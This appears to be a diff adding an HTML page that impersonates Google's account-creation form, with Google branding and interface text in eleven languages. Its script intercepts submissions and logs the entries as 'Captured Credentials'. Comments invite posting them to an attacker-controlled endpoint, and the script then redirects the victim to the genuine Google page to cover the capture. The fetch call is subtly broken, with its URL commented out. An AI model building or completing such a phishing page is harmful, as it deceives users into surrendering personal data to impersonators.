@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Create a Google Account</title>
+  <link rel="stylesheet" href="styless.css" />
+</head>
+<body>
+  <div class="form-wrapper">
+    <div class="form-container">
+      <img
+        src="C:\Users\user\Desktop\google\google_logo.png.png"
+        alt="Google Logo"
+        class="google-logo"
+      />
+      <h1 class="form-title">Create a Google Account</h1>
+      <p class="form-subtitle">Enter your name</p>
+
+      <form id="login-form" action="#" method="POST">
+        <div class="input-field">
+          <label for="firstName">First name</label>
+          <input
+            type="text"
+            id="firstName"
+            name="first_name"
+            value=" "
+            required
+          />
+        </div>
+        <div class="input-field">
+          <label for="lastName">Last name (optional)</label>
+          <input
+            type="text"
+            id="lastName"
+            name="last_name"
+            value=" "
+          />
+        </div>
+        <button type="submit" class="next-button">Next</button>
+      </form>
+    </div>
+    <div id="error-message" style="color:red;"></div>
+
+    <footer class="page-footer">
+      <div class="footer-left">
+        <!-- Language dropdown -->
+        <select id="language-select" name="language">
+          <option value="en" selected>English (United States)</option>
+          <option value="es">Español (España)</option>
+          <option value="fr">Français (France)</option>
+          <option value="de">Deutsch (Deutschland)</option>
+          <option value="ar">العربية</option>
+          <option value="ru">Русский (Россия)</option>
+          <option value="it">Italiano (Italia)</option>
+          <option value="zh">中文 (中国)</option>
+          <option value="ja">日本語 (日本)</option>
+          <option value="ko">한국어 (대한민국)</option>
+          <option value="sw">Kiswahili (East Africa)</option>
+        </select>
+      </div>
+      <div class="footer-right">
+        <a href="https://policies.google.com/privacy?hl=en-US" class="footer-link help-link">Help</a>
+        <a href="https://policies.google.com/privacy?hl=en-US" class="footer-link privacy-link">Privacy</a>
+        <a href="https://policies.google.com/privacy?hl=en-US" class="footer-link terms-link">Terms</a>
+      </div>
+    </footer>
+  </div>
+  <script>
+    // Object with translations for various languages
+const translations = {
+  en: {
+    title: "Create a Google Account",
+    subtitle: "Enter your name",
+    firstName: "First name",
+    lastName: "Last name (optional)",
+    next: "Next",
+    footerHelp: "Help",
+    footerPrivacy: "Privacy",
+    footerTerms: "Terms"
+  },
+  es: {
+    title: "Crear una cuenta de Google",
+    subtitle: "Ingresa tu nombre",
+    firstName: "Nombre",
+    lastName: "Apellido (opcional)",
+    next: "Siguiente",
+    footerHelp: "Ayuda",
+    footerPrivacy: "Privacidad",
+    footerTerms: "Términos"
+  },
+  fr: {
+    title: "Créer un compte Google",
+    subtitle: "Entrez votre nom",
+    firstName: "Prénom",
+    lastName: "Nom de famille (optionnel)",
+    next: "Suivant",
+    footerHelp: "Aide",
+    footerPrivacy: "Confidentialité",
+    footerTerms: "Conditions"
+  },
+  de: {
+    title: "Ein Google-Konto erstellen",
+    subtitle: "Geben Sie Ihren Namen ein",
+    firstName: "Vorname",
+    lastName: "Nachname (optional)",
+    next: "Weiter",
+    footerHelp: "Hilfe",
+    footerPrivacy: "Datenschutz",
+    footerTerms: "Nutzungsbedingungen"
+  },
+  ar: {
+    title: "إنشاء حساب جوجل",
+    subtitle: "أدخل اسمك",
+    firstName: "الاسم الأول",
+    lastName: "اسم العائلة (اختياري)",
+    next: "التالي",
+    footerHelp: "المساعدة",
+    footerPrivacy: "الخصوصية",
+    footerTerms: "الشروط"
+  },
+  ru: {
+    title: "Создать аккаунт Google",
+    subtitle: "Введите ваше имя",
+    firstName: "Имя",
+    lastName: "Фамилия (необязательно)",
+    next: "Далее",
+    footerHelp: "Помощь",
+    footerPrivacy: "Конфиденциальность",
+    footerTerms: "Условия"
+  },
+  it: {
+    title: "Crea un account Google",
+    subtitle: "Inserisci il tuo nome",
+    firstName: "Nome",
+    lastName: "Cognome (opzionale)",
+    next: "Avanti",
+    footerHelp: "Aiuto",
+    footerPrivacy: "Privacy",
+    footerTerms: "Termini"
+  },
+  zh: {
+    title: "创建 Google 帐号",
+    subtitle: "请输入您的姓名",
+    firstName: "名字",
+    lastName: "姓氏（可选）",
+    next: "下一步",
+    footerHelp: "帮助",
+    footerPrivacy: "隐私",
+    footerTerms: "条款"
+  },
+  ja: {
+    title: "Google アカウントの作成",
+    subtitle: "名前を入力してください",
+    firstName: "名",
+    lastName: "姓（任意）",
+    next: "次へ",
+    footerHelp: "ヘルプ",
+    footerPrivacy: "プライバシー",
+    footerTerms: "利用規約"
+  },
+  ko: {
+    title: "Google 계정 만들기",
+    subtitle: "이름을 입력하세요",
+    firstName: "이름",
+    lastName: "성(선택 사항)",
+    next: "다음",
+    footerHelp: "도움말",
+    footerPrivacy: "개인정보 보호",
+    footerTerms: "약관"
+  },
+  sw: {
+    title: "Unda Akaunti ya Google",
+    subtitle: "Weka jina lako",
+    firstName: "Jina la kwanza",
+    lastName: "Jina la mwisho (hiari)",
+    next: "Ifuatayo",
+    footerHelp: "Msaada",
+    footerPrivacy: "Faragha",
+    footerTerms: "Masharti"
+  }
+};
+
+// Function to update text elements based on the selected language
+function updateTranslations(lang) {
+  const translation = translations[lang];
+  if (translation) {
+    document.querySelector('.form-title').textContent = translation.title;
+    document.querySelector('.form-subtitle').textContent = translation.subtitle;
+    document.querySelector('label[for="firstName"]').textContent = translation.firstName;
+    document.querySelector('label[for="lastName"]').textContent = translation.lastName;
+    document.querySelector('.next-button').textContent = translation.next;
+    document.querySelector('.help-link').textContent = translation.footerHelp;
+    document.querySelector('.privacy-link').textContent = translation.footerPrivacy;
+    document.querySelector('.terms-link').textContent = translation.footerTerms;
+  }
+}
+
+// Listen for changes in the language dropdown
+document.getElementById('language-select').addEventListener('change', function () {
+  updateTranslations(this.value);
+});
+
+// Listen for the form submission event
+document.getElementById('login-form').addEventListener('submit', async function(e) {
+  e.preventDefault(); // Prevent the default form submission
+
+  const form = e.target;
+  const formData = new FormData(form);
+
+  // Capture the firstName and lastName values
+  const firstName = formData.get('first_name');
+  const lastName = formData.get('last_name');
+
+  // For demonstration: log the credentials (Remove in real use!)
+  console.log("Captured Credentials:", { firstName, lastName });
+
+  // Optional: Send the credentials to your controlled endpoint
+  // Uncomment and modify the URL below if you want to send the data to your server.
+  
+  try {
+    const response = await fetch(//'https://127.0.0.1/',
+     {
+      method: 'POST',
+      body: formData,
+    });
+    if (!response.ok) {
+      throw new Error(`Submission failed with status ${response.status}`);
+    }
+    // Process the server response if needed
+    const result = await response.json();
+    console.log('Server response:', result);
+  } catch (error) {
+    document.getElementById('error-message').textContent = error.message;
+    return;
+  }
+  
+
+  // After capturing (and optionally sending) the data, redirect the user to the genuine Google Accounts page
+  window.location.href = 'https://accounts.google.com';
+});
+  </script>
+</body>
+</html>
